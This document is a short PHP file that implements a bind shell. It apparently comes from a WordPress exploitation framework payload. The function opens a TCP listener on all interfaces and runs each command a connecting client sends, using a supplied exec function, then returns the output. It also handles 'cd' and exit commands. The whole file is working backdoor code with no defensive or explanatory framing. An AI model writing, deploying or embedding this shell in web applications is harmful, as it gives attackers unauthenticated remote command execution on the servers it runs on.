<?php
function startTcpServer($port, $wpxf_disabled, $wpxf_exec) {
    if (in_array('socket_create', $wpxf_disabled)) {
        die("Error: socket_create is disabled.");
    }

    $sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    if ($sock === false) {
        die("Could not create socket: " . socket_strerror(socket_last_error()));
    }

    if (socket_bind($sock, '0.0.0.0', $port) === false) {
        die("Could not bind socket: " . socket_strerror(socket_last_error($sock)));
    }

    if (socket_listen($sock, 5) === false) {
        die("Could not listen on socket: " . socket_strerror(socket_last_error($sock)));
    }

    echo "Server started on port $port\n";

    while (true) {
        $client = socket_accept($sock);
        if ($client === false) {
            echo "Failed to accept incoming connection: " . socket_strerror(socket_last_error($sock));
            continue;
        }

        $cwd = getcwd();
        socket_write($client, "Welcome to the TCP Shell. Current directory: $cwd\n");

        while (true) {
            $input = socket_read($client, 1024);
            if ($input === false) {
                break;
            }

            $command = trim($input);
            if (empty($command)) {
                continue;
            }

            if (strpos($command, 'cd ') === 0) {
                $dir = substr($command, 3);
                if (@chdir($dir)) {
                    $cwd = getcwd();
                    socket_write($client, "Changed directory to: $cwd\n");
                } else {
                    socket_write($client, "Directory change failed.\n");
                }
            } elseif (in_array(strtolower($command), ['exit', 'quit'])) {
                socket_write($client, "Exiting...\n");
                break;
            } else {
                ob_start();
                $output = call_user_func($wpxf_exec, $command);
                $output .= ob_get_clean();
                socket_write($client, $output);
            }
        }

        socket_close($client);
    }

    socket_close($sock);
}
